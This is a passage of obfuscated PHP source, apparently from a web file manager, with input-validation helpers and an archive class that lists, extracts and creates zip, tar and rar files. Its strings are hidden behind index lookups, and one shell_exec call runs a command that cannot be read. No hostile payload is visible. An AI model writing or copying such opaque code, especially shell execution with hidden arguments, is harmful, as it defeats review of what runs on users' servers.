if (method_exists(self::init(), $_SERVER[Ä¿Ş°¨][752])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ä¿Ş°¨][753])) { self::init()->clearTimeout(); } } } goto CÈ‹İî•¤; EøÀäÓÎ¦Ô: class Input { public static function getArray($aë‰’ÈøÜ) { goto f÷ÆÆ¿Òáß; c‘ªîö¯Ï: $fµ‹®‘Æ = array(); $c˜ªàë±¡õ = LNG($aÛ›¦á›à©[1836]); foreach ($aë‰’ÈøÜ as $eÜ¢ËììÉÕ => $eŞÙ¼Ô¸õ) { goto f÷Ï”ÙØÎ; f÷Ï”ÙØÎ: $eïŞ…œ•…Ä = _get($eŞÙ¼Ô¸õ, $aÛ›¦á›à©[1223], $c˜ªàë±¡õ . $aÛ›¦á›à©[867] . $eÜ¢ËììÉÕ); $BËÓí²ÂÎ = $eÜ¢ËììÉÕ; if (isset($eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1837]]) && $eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1837]]) { $BËÓí²ÂÎ = $eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1837]]; } goto Dê§´È…¬¯; Dê§´È…¬¯: if (!array_key_exists($eÜ¢ËììÉÕ, $in)) { if (array_key_exists($aÛ›¦á›à©[1838], $eŞÙ¼Ô¸õ)) { if (!is_null($eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1838]])) { $eÂİä½»Ò[$BËÓí²ÂÎ] = $eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1838]]; } } else { if (isset($eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1839]])) { $fµ‹®‘Æ[] = $eïŞ…œ•…Ä; } } continue; } if (isset($eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1839]]) && $eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1839]] == $aÛ›¦á›à©[278]) { $Cë½×“ÓË = json_decode($in[$eÜ¢ËììÉÕ], !0); if (is_array($Cë½×“ÓË)) { $eÂİä½»Ò[$BËÓí²ÂÎ] = $Cë½×“ÓË; } else { if (array_key_exists($aÛ›¦á›à©[1838], $eŞÙ¼Ô¸õ)) { if (!is_null($eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1838]])) { $eÂİä½»Ò[$BËÓí²ÂÎ] = $eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1838]]; } } else { $fµ‹®‘Æ[] = $eïŞ…œ•…Ä; } } continue; } $E•ñ»Ö»àğ = _get($eŞÙ¼Ô¸õ, $aÛ›¦á›à©[996]); goto Cî‰…éí; Cî‰…éí: if (isset($eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1839]]) && !self::check($in[$eÜ¢ËììÉÕ], $eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1839]], $E•ñ»Ö»àğ)) { if (array_key_exists($aÛ›¦á›à©[1838], $eŞÙ¼Ô¸õ)) { if (!is_null($eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1838]])) { $eÂİä½»Ò[$BËÓí²ÂÎ] = $eŞÙ¼Ô¸õ[$aÛ›¦á›à©[1838]]; } } else { $fµ‹®‘Æ[] = $eïŞ…œ•…Ä; } continue; } $eÂİä½»Ò[$BËÓí²ÂÎ] = $in[$eÜ¢ËììÉÕ]; goto fÇ·ùŠœ; fÇ·ùŠœ: } goto a½š¢¶‰À’; f÷ÆÆ¿Òáß: $aÛ›¦á›à© =& $_SERVER[Ä¿Ş°¨]; global $in; $eÂİä½»Ò = array(); goto c‘ªîö¯Ï; a½š¢¶‰À’: if (count($fµ‹®‘Æ) > 0) { show_json(implode($aÛ›¦á›à©[1840], $fµ‹®‘Æ), !1); } return $eÂİä½»Ò; goto AËÓ¬Ã¸ô†; AËÓ¬Ã¸ô†: } public static function reg($Bê ãòÃÖ = "\x72\145\161\165\151\162\145") { static $aÙº¤ëô‹„ = array("\162\145\161\x75\151\162\145" => "\x2e\53", "\x6e\165\x6d\142\x65\x72" => "\x5c\144\x2b", "\150\x65\170" => "\133\60\x2d\x39\101\55\106\141\55\146\x5d\53", "\x69\156\x74" => "\133\55\134\53\135\x3f\x5c\144\53", "\x62\x6f\157\x6c" => "\60\174\x31", "\146\x6c\157\141\x74" => "\x5b\x2d\x5c\53\x5d\x3f\x5c\x64\53\50\x5c\56\134\x64\x2b\x29\x3f", "\145\156\x67\154\151\x73\x68" => "\133\101\55\132\x61\55\x7a\x20\x5d\53", "\143\150\x69\x6e\145\x73\145" => "\133\x5c\170\173\x34\145\x30\60\x7d\x2d\134\x78\173\x39\146\x61\x35\175\x5d\x2b", "\x68\141\163\x43\150\x69\156\145\163\145" => "\57\50\x5b\134\170\173\x34\145\x30\60\175\55\x5c\170\173\71\146\x61\x35\x7d\135\x2b\51\x2f\x75", "\145\155\x61\151\154" => "\134\x77\x2b\50\x5b\134\56\134\55\x5d\x5c\x77\53\51\x2a\134\x40\x5c\167\53\50\133\x5c\56\134\x2d\135\134\x77\x2b\51\x2a\x5c\56\x5c\x77\x2b", "\x70\x68\157\156\x65" => "\x31\x5b\63\55\x39\x5d\134\144\x7b\71\x7d", "\x74\x65\x6c\160\150\157\156\145" => "\x28\134\50\134\x64\173\63\54\64\x7d\x5c\x29\x7c\134\144\x7b\x33\x2c\64\175\x2d\x7c\x5c\x73\x29\x3f\x5c\x64\x7b\x37\x2c\x31\64\175", "\165\x72\154" => "\50\x68\164\164\x70\x7c\x66\164\160\174\x68\x74\x74\x70\163\x29\x3a\x5c\57\x5c\57\x5b\x5c\x77\134\x2d\137\x5d\x2b\x28\x5c\56\133\134\167\134\55\137\x5d\53\x29\53\x28\x5b\x5c\167\x5c\55\134\56\54\x40\x3f\x5e\75\x25\x26\x3a\134\x2f\x7e\134\53\43\x5d\x2a\x5b\x5c\x77\134\55\x5c\x40\77\136\75\45\x26\134\x2f\x7e\134\x2b\x23\x5d\51\x3f", "\x75\x72\154\x46\165\154\x6c" => "\x5b\141\55\172\x41\55\172\135\x2b\72\134\x2f\134\57\133\x5e\134\x73\x5d\x2a", "\151\160" => "\x28\134\144\x7b\x31\x2c\x33\x7d\x5c\56\x29\173\x33\175\x28\x5c\144\173\61\x2c\x33\x7d\51", "\x7a\x69\x70" => "\x5b\x31\55\x39\135\134\x64\x7b\x35\x7d\x28\77\41\x5c\x64\x29", "\x69\144\x43\141\x72\144" => "\50\134\144\x7b\61\x35\x7d\51\x7c\50\x5c\x64\173\x31\x37\175\x28\134\x64\x7c\x58\174\170\51\51", "\143\157\x6c\157\x72" => "\x23\50\133\x30\x2d\71\x41\55\106\141\x2d\146\135\x7b\63\x7d\x7c\133\60\x2d\x39\101\55\106\x61\55\146\135\173\66\175\51", "\x74\151\155\x65" => "\50\x5b\60\x2d\61\x5d\x5c\x64\174\x32\133\60\x2d\x34\x5d\51\72\133\60\x2d\65\x5d\x5c\144", "\x64\141\x74\145" => "\x5c\x64\173\x34\175\133\55\134\57\x5d\77\x28\60\x5b\x31\55\x39\135\x7c\x31\133\60\x2d\x32\135\51\x5b\x2d\134\57\x5d\77\x28\133\60\x2d\62\135\x5c\144\174\63\133\60\55\61\x5d\x29", "\x64\141\164\x65\x54\151\155\x65" => "\134\x64\x7b\64\175\133\55\x5c\x2f\135\77\x28\x30\x5b\x31\x2d\71\x5d\x7c\x31\x5b\60\55\62\x5d\x29\x5b\55\x5c\57\135\77\50\133\x30\55\62\x5d\134\144\174\x33\133\x30\55\61\x5d\51\x5c\x73\53\50\133\x30\55\61\x5d\134\x64\x7c\62\133\60\55\64\x5d\x29\72\x5b\x30\55\65\135\134\x64", "\160\x61\x73\x73\167\x6f\x72\144" => "\50\x3f\x3d\56\x2a\134\x64\x29\50\77\x3d\x2e\x2a\133\141\55\x7a\135\51\x28\77\75\56\52\x5b\101\x2d\x5a\x5d\x29\x2e\x7b\70\54\62\60\175", "\x6b\x65\171" => "\x5b\x41\x2d\132\141\x2d\x7a\x30\55\71\137\x5c\x2d\134\x2e\x5d\53", "\153\145\x79\106\x75\x6c\154" => "\133\x41\55\132\141\x2d\x7a\60\x2d\x39\x5f\134\x2d\134\56\134\163\x2c\135\x2b"); if (!$Bê ãòÃÖ) { return $aÙº¤ëô‹„; } return $aÙº¤ëô‹„[$Bê ãòÃÖ]; } public static function check($FëÙ´…ÏĞŒ, $dïİÈ˜Ú¯À, $a÷­¬ïÜ·ó = null) { $e·Ã”ºíƒ¬ =& $_SERVER[Ä¿Ş°¨]; switch ($dïİÈ˜Ú¯À) { case $e·Ã”ºíƒ¬[7]: return in_array($FëÙ´…ÏĞŒ, $a÷­¬ïÜ·ó); break; case $e·Ã”ºíƒ¬[1841]: return floatval($FëÙ´…ÏĞŒ) > $a÷­¬ïÜ·ó; break; case $e·Ã”ºíƒ¬[1842]: return floatval($FëÙ´…ÏĞŒ) < $a÷­¬ïÜ·ó; break; case $e·Ã”ºíƒ¬[321]: return strlen($FëÙ´…ÏĞŒ) >= $a÷­¬ïÜ·ó[0] && strlen($FëÙ´…ÏĞŒ) <= $a÷­¬ïÜ·ó[1]; break; case $e·Ã”ºíƒ¬[321]: if (is_array($a÷­¬ïÜ·ó)) { return strlen($FëÙ´…ÏĞŒ) >= $a÷­¬ïÜ·ó[0] && strlen($FëÙ´…ÏĞŒ) <= $a÷­¬ïÜ·ó[1]; break; } else { return strlen($FëÙ´…ÏĞŒ) == $a÷­¬ïÜ·ó; break; } case $e·Ã”ºíƒ¬[317]: return floatval($FëÙ´…ÏĞŒ) >= $a÷­¬ïÜ·ó[0] && floatval($FëÙ´…ÏĞŒ) <= $a÷­¬ïÜ·ó[1]; break; } $Bìè›ù¾Öæ = self::reg(!1); $dïİÈ˜Ú¯À = isset($Bìè›ù¾Öæ[$dïİÈ˜Ú¯À]) ? $Bìè›ù¾Öæ[$dïİÈ˜Ú¯À] : $dïİÈ˜Ú¯À; if (substr($dïİÈ˜Ú¯À, 0, 1) != $e·Ã”ºíƒ¬[8]) { $dïİÈ˜Ú¯À = $e·Ã”ºíƒ¬[1843] . $dïİÈ˜Ú¯À . $e·Ã”ºíƒ¬[1844]; } return preg_match($dïİÈ˜Ú¯À, $FëÙ´…ÏĞŒ) === 1; } public static function get($BÊ”­™¹ˆó, $D÷äôä§§á = null, $aãê¤›Ã«Š = null, $BÏÉ’÷¬òÏ = null) { goto f¹…ÇõÇÈ; c¶†Ü‰ÊÅŞ: return $eÍµÕÖßÒ®[$BÊ”­™¹ˆó]; goto B‡ÜïµÌ¬Í; f¹…ÇõÇÈ: $cĞ™‡ƒ¢õ =& $_SERVER[Ä¿Ş°¨]; $FôÜ‡îŒÙ‹ = array(); if (!is_null($aãê¤›Ã«Š)) { $FôÜ‡îŒÙ‹[$cĞ™‡ƒ¢õ[34]] = $aãê¤›Ã«Š; } goto A²¯Ûì„²’; A²¯Ûì„²’: if (!is_null($BÏÉ’÷¬òÏ)) { $FôÜ‡îŒÙ‹[$cĞ™‡ƒ¢õ[996]] = $BÏÉ’÷¬òÏ; } if (!is_null($D÷äôä§§á)) { $FôÜ‡îŒÙ‹[$cĞ™‡ƒ¢õ[1839]] = $D÷äôä§§á; } $eÍµÕÖßÒ® = Input::getArray(array($BÊ”­™¹ˆó => $FôÜ‡îŒÙ‹)); goto c¶†Ü‰ÊÅŞ; B‡ÜïµÌ¬Í: } } class KodArchive { static function init() { goto bµíË‚ì²«; bµíË‚ì²«: $E½Ç´”Ğè =& $_SERVER[Ä¿Ş°¨]; if (defined($E½Ç´”Ğè[1845])) { return; } define($E½Ç´”Ğè[1845], SDK_DIR . $E½Ç´”Ğè[1846]); goto bÙ‘é·ˆ†¿; d¼ßØÆ±é¶: require_once ARCHIVE_LIB . $E½Ç´”Ğè[1853]; require_once ARCHIVE_LIB . $E½Ç´”Ğè[1854]; require_once ARCHIVE_LIB . $E½Ç´”Ğè[1855]; goto f´™ãµĞƒ¬; bñ¿¶º¿¥: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $E½Ç´”Ğè[1851]; require_once ARCHIVE_LIB . $E½Ç´”Ğè[1852]; goto d¼ßØÆ±é¶; f´™ãµĞƒ¬: require_once ARCHIVE_LIB . $E½Ç´”Ğè[1856]; goto BˆÊ®¯êõ; bÙ‘é·ˆ†¿: define($E½Ç´”Ğè[1847], TEMP_FILES); define($E½Ç´”Ğè[1848], TEMP_FILES); define($E½Ç´”Ğè[1849], $E½Ç´”Ğè[1850]); goto bñ¿¶º¿¥; BˆÊ®¯êõ: } static function checkIfType($dï›­ƒ›˜á, $C§Š¶ÖŞã) { goto E‹½­ªÉ‰; D’‡ ËĞˆä: return $A›†Ï­”™; goto Eß÷Í‹àîº; f­ÉÛÔ¾‚: $A›†Ï­”™ = in_array($dï›­ƒ›˜á, $déË…ãÌ¸ƒ[$C§Š¶ÖŞã]); if ($A›†Ï­”™ && ($C§Š¶ÖŞã == $d‚øËœ•ˆ[297] || $C§Š¶ÖŞã == $d‚øËœ•ˆ[1860]) && (!function_exists($d‚øËœ•ˆ[1868]) || !function_exists($d‚øËœ•ˆ[1869]))) { show_tips($d‚øËœ•ˆ[1870]); } if ($A›†Ï­”™ && $C§Š¶ÖŞã == $d‚øËœ•ˆ[1030] && (!function_exists($d‚øËœ•ˆ[1871]) || !strstr(shell_exec($d‚øËœ•ˆ[1872]), $d‚øËœ•ˆ[1873]))) { show_tips($d‚øËœ•ˆ[1874]); } goto D’‡ ËĞˆä; E‹½­ªÉ‰: $d‚øËœ•ˆ =& $_SERVER[Ä¿Ş°¨]; self::init(); $déË…ãÌ¸ƒ = array($d‚øËœ•ˆ[297] => array($d‚øËœ•ˆ[297], $d‚øËœ•ˆ[1857], $d‚øËœ•ˆ[1858], $d‚øËœ•ˆ[1859]), $d‚øËœ•ˆ[1860] => array($d‚øËœ•ˆ[1860], $d‚øËœ•ˆ[1861], $d‚øËœ•ˆ[1028], $d‚øËœ•ˆ[1026]), $d‚øËœ•ˆ[1030] => array($d‚øËœ•ˆ[1030], $d‚øËœ•ˆ[1862], $d‚øËœ•ˆ[1863], $d‚øËœ•ˆ[1864], $d‚øËœ•ˆ[1865], $d‚øËœ•ˆ[1866], $d‚øËœ•ˆ[1867])); goto f­ÉÛÔ¾‚; Eß÷Í‹àîº: } static function listContent($DåÇŠ¡îàè, $D©ˆ¤¥ãñ = true) { $B¶›½Ø “ =& $_SERVER[Ä¿Ş°¨]; self::init(); $A¬¥˜ì—§Í = !empty($GLOBALS[$B¶›½Ø “[1034]]) ? $GLOBALS[$B¶›½Ø “[1034]] : get_path_ext($DåÇŠ¡îàè); $e §´éíãË = !1; if (self::checkIfType($A¬¥˜ì—§Í, $B¶›½Ø “[1860])) { $E²Õ¬Ÿ¿Á = PclTarList($DåÇŠ¡îàè, $A¬¥˜ì—§Í); $e §´éíãË = array(); for ($cå±‚øó— = 0; $cå±‚øó— < count($E²Õ¬Ÿ¿Á); $cå±‚øó—++) { $CÆòí†¡Šê = $E²Õ¬Ÿ¿Á[$cå±‚øó—]; if ($CÆòí†¡Šê[$B¶›½Ø “[1875]] == $B¶›½Ø “[1876] || $CÆòí†¡Šê[$B¶›½Ø “[1875]] == $B¶›½Ø “[1877]) { continue; } if ($D©ˆ¤¥ãñ) { $CÆòí†¡Šê[$B¶›½Ø “[1878]] = ltrim($CÆòí†¡Šê[$B¶›½Ø “[1878]], $B¶›½Ø “[1132]); } if ($CÆòí†¡Šê[$B¶›½Ø “[1875]] == $B¶›½Ø “[1879]) { $CÆòí†¡Šê[$B¶›½Ø “[76]] = !0; } else { $CÆòí†¡Šê[$B¶›½Ø “[76]] = !1; } $CÆòí†¡Šê[$B¶›½Ø “[1021]] = $cå±‚øó—; $e §´éíãË[] = $CÆòí†¡Šê; } } else { if (self::checkIfType($A¬¥˜ì—§Í, $B¶›½Ø “[1030])) { $DÏß»’”³ = kodRarArchive::listContent($DåÇŠ¡îàè); if (!$DÏß»’”³[$B¶›½Ø “[1017]]) { return $DÏß»’”³; } else { $e §´éíãË = $DÏß»’”³[$B¶›½Ø “[1019]]; } } else { if (kodZipArchive::support($B¶›½Ø “[350])) { $e §´éíãË = kodZipArchive::listContent($DåÇŠ¡îàè); } else { $bÏ´‚÷¦´ë = new PclZip($DåÇŠ¡îàè); $e §´éíãË = $bÏ´‚÷¦´ë->listContent(); } } } if ($e §´éíãË) { $Bá×Ë×Š‚ = unzip_charset_get($e §´éíãË); $D©ˆ¤¥ãñ = $D©ˆ¤¥ãñ && function_exists($B¶›½Ø “[65]); for ($cå±‚øó— = 0; $cå±‚øó— < count($e §´éíãË); $cå±‚øó—++) { $e §´éíãË[$cå±‚øó—][$B¶›½Ø “[1878]] = str_replace(array($B¶›½Ø “[1057], $B¶›½Ø “[1880]), $B¶›½Ø “[756], $e §´éíãË[$cå±‚øó—][$B¶›½Ø “[1878]]); if ($D©ˆ¤¥ãñ) { $e §´éíãË[$cå±‚øó—][$B¶›½Ø “[1878]] = iconv_to($e §´éíãË[$cå±‚øó—][$B¶›½Ø “[1878]], $Bá×Ë×Š‚, $B¶›½Ø “[322]); unset($e §´éíãË[$cå±‚øó—][$B¶›½Ø “[1881]]); } } return array($B¶›½Ø “[1017] => !0, $B¶›½Ø “[1019] => $e §´éíãË); } else { return array($B¶›½Ø “[1017] => !1, $B¶›½Ø “[1019] => $e §´éíãË); } } static function extract($DÈŞå”èº, $A¤‹³ÔÀŠí, $F‚·ò¨õ = "\x2d\x31", &$e¨ŒØ„±èà = false) { goto aÍêãÏ·×ì; d‚¤Ö¶Áóº: if (self::checkIfType($DÛçÅ‚‚ÂÉ, $C¤¨”æÑŞ[1860])) { if ($F‚·ò¨õ != $C¤¨”æÑŞ[1016]) { $bÚÁ÷–£ËŒ = unzip_pre_name($bÚÁ÷–£ËŒ); $a¬£ÜÁ¶á = unzip_pre_name($a¬£ÜÁ¶á); $d‘Ò²…‹ = PclTarExtractList($DÈŞå”èº, array($bÚÁ÷–£ËŒ), $A¤‹³ÔÀŠí, $a¬£ÜÁ¶á, $DÛçÅ‚‚ÂÉ); } else { $d‘Ò²…‹ = PclTarExtract($DÈŞå”èº, $A¤‹³ÔÀŠí, $C¤¨”æÑŞ[357], $DÛçÅ‚‚ÂÉ); } return array($C¤¨”æÑŞ[1017] => $d‘Ò²…‹, $C¤¨”æÑŞ[1019] => PclErrorString(!0)); } else { if (self::checkIfType($DÛçÅ‚‚ÂÉ, $C¤¨”æÑŞ[1030])) { return kodRarArchive::extract($DÈŞå”èº, $A¤‹³ÔÀŠí, $DÛçÅ‚‚ÂÉ, $e¨ŒØ„±èà); } else { if (kodZipArchive::support($C¤¨”æÑŞ[1882])) { return kodZipArchive::extract($DÈŞå”èº, $A¤‹³ÔÀŠí, $e¨ŒØ„±èà); } else { $Fñƒª—Çøà = new PclZip($DÈŞå”èº); if ($F‚·ò¨õ != $C¤¨”æÑŞ[1016]) { $d‘Ò²…‹ = $Fñƒª—Çøà->extract(PCLZIP_OPT_PATH, $A¤‹³ÔÀŠí, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $C¤¨”æÑŞ[1883], PCLZIP_OPT_BY_NAME, $DáŸ×…‹[$C¤¨”æÑŞ[1878]], PCLZIP_OPT_REMOVE_PATH, $a¬£ÜÁ¶á, PCLZIP_OPT_REPLACE_NEWER); } else { $d‘Ò²…‹ = $Fñƒª—Çøà->extract(PCLZIP_OPT_PATH, $A¤‹³ÔÀŠí, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $C¤¨”æÑŞ[1883], PCLZIP_OPT_REPLACE_NEWER); } return array($C¤¨”æÑŞ[1017] => $d‘Ò²…‹, $C¤¨”æÑŞ[1019] => $Fñƒª—Çøà->errorName(!0)); } } } return array($C¤¨”æÑŞ[1017] => !1, $C¤¨”æÑŞ[1019] => $C¤¨”æÑŞ[1884]); goto b‚ØËÍÛ§„; aÍêãÏ·×ì: $C¤¨”æÑŞ =& $_SERVER[Ä¿Ş°¨]; self::init(); $DÛçÅ‚‚ÂÉ = !empty($GLOBALS[$C¤¨”æÑŞ[1034]]) ? $GLOBALS[$C¤¨”æÑŞ[1034]] : get_path_ext($DÈŞå”èº); goto eƒ­ªŸï; eƒ­ªŸï: $d¨â¹”ˆÛ˜ = self::listContent($DÈŞå”èº, !1); if (!$d¨â¹”ˆÛ˜[$C¤¨”æÑŞ[1017]]) { return $d¨â¹”ˆÛ˜; } if ($F‚·ò¨õ != $C¤¨”æÑŞ[1016]) { goto F­ŒÖÁïœÇ; dÇƒéíÅÖ¦: if ($GLOBALS[$C¤¨”æÑŞ[6]][$C¤¨”æÑŞ[1130]] != $C¤¨”æÑŞ[322]) { $bÚÁ÷–£ËŒ = unzip_pre_name($e¨ŒØ„±èà); } $a¬£ÜÁ¶á = get_path_father($e¨ŒØ„±èà); if ($a¬£ÜÁ¶á == $e¨ŒØ„±èà) { $a¬£ÜÁ¶á = $C¤¨”æÑŞ[33]; } goto B…İ…Ì‚„Ï; B…İ…Ì‚„Ï: if ($DáŸ×…‹[$C¤¨”æÑŞ[76]]) { $bÚÁ÷–£ËŒ = rtrim($bÚÁ÷–£ËŒ, $C¤¨”æÑŞ[8]) . $C¤¨”æÑŞ[8]; $e¨ŒØ„±èà = array($e¨ŒØ„±èà); } $BÎ§Šâ†õ = str_replace($C¤¨”æÑŞ[93], $C¤¨”æÑŞ[8], $bÚÁ÷–£ËŒ); if (substr($BÎ§Šâ†õ, -1) == $C¤¨”æÑŞ[8]) { if (!strstr(trim($BÎ§Šâ†õ, $C¤¨”æÑŞ[8]), $C¤¨”æÑŞ[8])) { $A¤‹³ÔÀŠí = $A¤‹³ÔÀŠí . get_path_this($BÎ§Šâ†õ) . $C¤¨”æÑŞ[8]; } } else { if ($a¬£ÜÁ¶á == $bÚÁ÷–£ËŒ) { $a¬£ÜÁ¶á = $C¤¨”æÑŞ[33]; } } goto Fâ ±ÚËºÓ; F­ŒÖÁïœÇ: $DáŸ×…‹ = self::fileIndex($d¨â¹”ˆÛ˜[$C¤¨”æÑŞ[1019]], $F‚·ò¨õ); $e¨ŒØ„±èà = str_replace(array($C¤¨”æÑŞ[1057], $C¤¨”æÑŞ[1880]), $C¤¨”æÑŞ[70], $DáŸ×…‹[$C¤¨”æÑŞ[1878]]); $bÚÁ÷–£ËŒ = $e¨ŒØ„±èà; goto dÇƒéíÅÖ¦; Fâ ±ÚËºÓ: } goto d‚¤Ö¶Áóº; b‚ØËÍÛ§„: } static function fileIndex($eøáÂÙôËê, $aØÍÙ‚„Ü, $e·Ò²«áæƒ = false) { goto aá›Æ£×ù‘; CºÌò„òàë: $E†ĞÕÕ‘‡Ë = $AŠ‡±Ãğìâ; if ($e·Ò²«áæƒ) { $E†ĞÕÕ‘‡Ë = $AŠ‡±Ãğìâ[$e·Ò²«áæƒ]; if ($AŠ‡±Ãğìâ[$A‰ùŠÀ‘šõ[76]]) { $E†ĞÕÕ‘‡Ë = rtrim($E†ĞÕÕ‘‡Ë, $A‰ùŠÀ‘šõ[8]) . $A‰ùŠÀ‘šõ[8]; } } return $E†ĞÕÕ‘‡Ë; goto fƒ˜Ç†®¢á; aá›Æ£×ù‘: $A‰ùŠÀ‘šõ =& $_SERVER[Ä¿Ş°¨]; self::init(); if (!is_array($eøáÂÙôËê)) { return !1; } goto câ×Ùà‘ï; câ×Ùà‘ï: $dõ„ØŠ»í = count($eøáÂÙôËê); for ($D¶´”ñ¦Ø = 0; $D¶´”ñ¦Ø < $dõ„ØŠ»í; $D¶´”ñ¦Ø++) { if ($aØÍÙ‚„Ü == $eøáÂÙôËê[$D¶´”ñ¦Ø][$A‰ùŠÀ‘šõ[1021]]) { $AŠ‡±Ãğìâ = $eøáÂÙôËê[$D¶´”ñ¦Ø]; break; } } if (!$AŠ‡±Ãğìâ) { show_tips($A‰ùŠÀ‘šõ[1885]); } goto CºÌò„òàë; fƒ˜Ç†®¢á: } static function extractZipFile($FõÒ­áŞÁŒ, $Dµ¯ÂÅŠ×, $BÌ¯Æ¬‘Ë³ = false) { goto EµËËÕ´”ù; DæÖİÄ‘éÑ: mk_dir($D¦½ÉÖĞª); $b±Ÿ­ğæ£ = $D¦½ÉÖĞª . md5($FõÒ­áŞÁŒ . $Dµ¯ÂÅŠ×); if ($BÌ¯Æ¬‘Ë³) { $b±Ÿ­ğæ£ = $D¦½ÉÖĞª . $BÌ¯Æ¬‘Ë³; } goto e„š¶‰•¶Ç; Bšæ’‡Ìè²: $D› å¹ğöê = get_path_father($Dµ¯ÂÅŠ×); if ($D› å¹ğöê == $Dµ¯ÂÅŠ×) { $D› å¹ğöê = $aÀÔ¨ãóÚ[33]; } $A‚Ÿ˜˜´èŠ = $E¿´Á°‚Ä…->extract(PCLZIP_OPT_PATH, $D¦½ÉÖĞª, PCLZIP_CB_PRE_FILE_NAME, $aÀÔ¨ãóÚ[1883], PCLZIP_OPT_REMOVE_PATH, $D› å¹ğöê, PCLZIP_OPT_BY_NAME, $Dµ¯ÂÅŠ×); goto D¯„¦„±; D¯„¦„±: if (!file_exists($AÃƒ‡Î˜ )) { return !1; } @rename($AÃƒ‡Î˜ , $b±Ÿ­ğæ£); return $b±Ÿ­ğæ£; goto A„š¬šŠ†’; e„š¶‰•¶Ç: if (file_exists($b±Ÿ­ğæ£)) { return $b±Ÿ­ğæ£; } $E¿´Á°‚Ä… = new PclZip($FõÒ­áŞÁŒ); $AÃƒ‡Î˜  = unzip_filter_ext($D¦½ÉÖĞª . get_path_this($Dµ¯ÂÅŠ×)); goto Bšæ’‡Ìè²; EµËËÕ´”ù: $aÀÔ¨ãóÚ =& $_SERVER[Ä¿Ş°¨]; self::init(); $D¦½ÉÖĞª = TEMP_FILES . hash_path($FõÒ­áŞÁŒ) . $aÀÔ¨ãóÚ[8]; goto DæÖİÄ‘éÑ; A„š¬šŠ†’: } static function filePreview($F¦­Ğ÷‡–, $B¡º‡«‹‘, $CöîÓµ»à© = false, $c´ÎŠÖ¶â = false) { goto cóƒÆ•à˜Ó; b¸ò„¬«©›: if (!$dèÓ¼‡ŠÁ—[$f¨‹’ÂóÖç[1017]]) { show_json($dèÓ¼‡ŠÁ—[$f¨‹’ÂóÖç[1019]], !1); } if (!file_exists($fë¨Û Àõ)) { show_json($f¨‹’ÂóÖç[1887], !1); } @rename($fë¨Û Àõ, $a—ØĞÚ…Ù); goto AáâöùÊ‘¬; D’‚‡ÚçŞÕ: $a­Û¿’‚ù = unzip_pre_name($a­Û¿’‚ù); $D³†×ÕÖÇï = get_path_this($a­Û¿’‚ù); $fë¨Û Àõ = unzip_filter_ext($Còº¢·İÍ . $D³†×ÕÖÇï); goto b¸ò„¬«©›; a©ç¤¡öÎ“: mk_dir($Còº¢·İÍ); $a—ØĞÚ…Ù = $Còº¢·İÍ . md5($F¦­Ğ÷‡– . $B¡º‡«‹‘ . $c´ÎŠÖ¶â); $a­Û¿’‚ù = $f¨‹’ÂóÖç[33]; goto Fª†¾ŠË¡‹; cóƒÆ•à˜Ó: $f¨‹’ÂóÖç =& $_SERVER[Ä¿Ş°¨]; self::init(); $Còº¢·İÍ = TEMP_FILES . hash_path($F¦­Ğ÷‡–) . $f¨‹’ÂóÖç[8]; goto a©ç¤¡öÎ“; AáâöùÊ‘¬: if (!file_exists($a—ØĞÚ…Ù)) { del_dir($Còº¢·İÍ); show_json($f¨‹’ÂóÖç[1888]); } IO::fileOut($a—ØĞÚ…Ù, $CöîÓµ»à©, $D³†×ÕÖÇï); goto F—¾š´ïåõ; Fª†¾ŠË¡‹: $dèÓ¼‡ŠÁ— = self::extract($F¦­Ğ÷‡–, $Còº¢·İÍ, $B¡º‡«‹‘, $a­Û¿’‚ù); if (is_array($a­Û¿’‚ù)) { show_json($f¨‹’ÂóÖç[1886], !1); } if (file_exists($a—ØĞÚ…Ù)) { IO::fileOut($a—ØĞÚ…Ù, $CöîÓµ»à©, get_path_this($a­Û¿’‚ù)); return; } goto D’‚‡ÚçŞÕ; F—¾š´ïåõ: } static function create($cîé¾¦§™, $a¯¿Ñ‰–ğ) { $D’îİ®¢ô =& $_SERVER[Ä¿Ş°¨]; self::init(); $c ˜«…Ó—— = get_path_ext($cîé¾¦§™); $dÔóˆÆ¤¸ó = !1; if (self::checkIfType($c ˜«…Ó——, $D’îİ®¢ô[297])) { if (kodZipArchive::support($D’îİ®¢ô[995])) { return kodZipArchive::create($cîé¾¦§™, $a¯¿Ñ‰–ğ); } $C«‡ô’Ÿ¦‰ = new PclZip($cîé¾¦§™); foreach ($a¯¿Ñ‰–ğ as $eß¦İƒ½­Ô => $eèÉ£ƒŸĞï) { $eèÉ£ƒŸĞï = str_replace($D’îİ®¢ô[471], $D’îİ®¢ô[8], $eèÉ£ƒŸĞï); $Bï×ä³ÜĞ› = Kodio::clear(get_path_father($eèÉ£ƒŸĞï)); if ($eß¦İƒ½­Ô == 0) { $dÔóˆÆ¤¸ó = $C«‡ô’Ÿ¦‰->create($eèÉ£ƒŸĞï, PCLZIP_OPT_REMOVE_PATH, $Bï×ä³ÜĞ›, PCLZIP_CB_PRE_FILE_NAME, $D’îİ®¢ô[1889]); continue; } $dÔóˆÆ¤¸ó = $C«‡ô’Ÿ¦‰->add($eèÉ£ƒŸĞï, PCLZIP_OPT_REMOVE_PATH, $Bï×ä³ÜĞ›, PCLZIP_CB_PRE_FILE_NAME, $D’îİ®¢ô[1889]); } } else { if (self::checkIfType($c ˜«…Ó——, $D’îİ®¢ô[1860])) { foreach ($a¯¿Ñ‰–ğ as $eß¦İƒ½­Ô => $eèÉ£ƒŸĞï) { $eèÉ£ƒŸĞï = str_replace($D’îİ®¢ô[471], $D’îİ®¢ô[8], $eèÉ£ƒŸĞï); 